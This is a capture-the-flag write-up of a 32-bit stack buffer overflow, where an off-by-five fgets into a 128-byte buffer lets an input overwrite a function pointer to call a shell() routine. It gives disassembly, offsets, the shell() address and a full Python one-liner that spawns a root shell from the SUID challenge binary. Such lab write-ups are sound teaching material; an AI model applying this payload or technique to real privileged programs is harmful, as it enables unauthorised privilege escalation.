## 1. Binary Specifications & Environmental Audit
Initial reconnaissance of the target challenge binary was conducted using standard Linux CLI utilities to map out the execution context and active kernel-space defenses.

### Mitigation Check (Checksec):
* **Architecture:** ELF 32-bit LSB executable (Intel 80386). Parameter passing adheres to the legacy stack-driven calling convention.
* **Stack Canary:** `No canary found`. The application lacks stack cookies, permitting unhindered manipulation of the function's return state and local stack variables.
* **NX (No-Execute):** `NX enabled`. The stack segment is non-executable, neutralizing traditional shellcode injection attempts.
* **PIE (Position Independent Executable):** `No PIE`. The binary's code section maps to static, immutable virtual memory addresses.
* **ASLR (Address Space Layout Randomization):** `OFF`. Global memory layout consistency is maintained across sequential process instantiations.

---

## 2. Static Analysis & Source Code Review
The software's logic was evaluated via its provided C source code. The binary instantiates three critical components within its `main` function stack frame:

```c
int var;
void (*func)() = sup;
char buf[128];
```

### Vulnerability Identification:
The security flaw lies within the input ingestion layer. The program utilizes the `fgets` routine to capture user parameters from the standard input stream (`stdin`):

```c
fgets(buf, 133, stdin);
```

While the target stack destination buffer `buf` is statically allocated a capacity of exactly **128 bytes**, the `fgets` configuration explicitly allows up to **133 bytes** of data to be read into memory. This programmatic mismatch induces a classic **Stack-based Buffer Overflow** constraint window, allowing an operator to overflow the spatial boundaries of `buf` by up to 5 bytes.

### Target Constraints:
To alter the application's runtime execution path and invoke the privileged system routine, the operator must overwrite the `func` function pointer. Instead of executing the default `sup()` routine, the pointer must be redirected to the `shell()` function:

```c
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
```

Because variables allocated sequentially within a function block are stacked contiguously in memory, the `func` function pointer is positioned immediately adjacent to the upper boundary of the `buf` array.

---

## 3. Disassembly & Memory Alignment Audit
Because modern compilers (GCC) introduce stack alignment optimization features, static position mapping via assembly analysis was performed within GDB to determine the exact structural offsets of the local variables without executing the binary.

Inspecting the disassembly of the `main` function revealed the structural layout of the stack configuration:

```assembly
0x080485a9 <+37>:    mov    DWORD PTR [ebp-0xc], edx
...
0x080485bd <+57>:    lea    edx, [ebp-0x8c]
0x080485c3 <+63>:    push   edx
0x080485c6 <+66>:    call   0x8048390 <fgets@plt>
```

### Offset Calculations:
* The target function pointer variable `func` is assigned to the stack coordinate **`ebp - 0xc`**.
* The input buffer destination `buf` begins at the stack coordinate **`ebp - 0x8c`**.

Calculating the precise spatial delta between the two locations:

$$\text{Padding} = 0\text{x}8\text{c} - 0\text{x}\text{c} = 0\text{x}80 \longrightarrow \text{128 bytes}$$

The analysis demonstrates that the compiler did not introduce any padding bytes between the two fields. The function pointer sits exactly **128 bytes** from the start of the user input buffer.

### Resolution of Target Address:
Inspecting the binary symbol tables mapped the exact execution target vector:

```text
gef➤  print shell
$1 = {<text variable, no debug info>} 0x8048516 <shell>
```

---

## 4. Exploitation Strategy & Payload Engineering

### Memory Alignment & Endianness:
Exploitation requires filling the 128-byte storage area of `buf` with arbitrary padding bytes before immediately overwriting the 4 bytes corresponding to the `func` storage tracker.

Due to the underlying Intel x86 architecture, the CPU processes data using **Little-Endian byte ordering**. Consequently, the target hexadecimal entry point address `0x08048516` must be transmitted across the input stream in reverse byte sequence:

**Target DWORD :** `0x08048516` $\longrightarrow$ **Byte Stream Pattern :** `\x16\x85\x04\x08`

### Exploit Orchestration:
The automated attack payload leverages a nested subshell structure. An initial Python string generation operation provides the static padding and the Little-Endian byte injection. 

This stream is concatenated with an active `cat` session inside a pipe (`|`) to prevent an immediate End-Of-File (EOF) termination signal, keeping the newly spawned privileged bash process open and responsive to interactive terminal entries:

```bash
(python -c "print('A' * 128 + '\x16\x85\x04\x08')"; cat) | ./ch15
```

Executing the chain successfully compromises the local state tracking, hijacking the internal function pointer invocation mechanism to grant the operator a local shell context running under the elevated privileges of the binary's SUID owner, allowing for the acquisition of the secure storage flags.
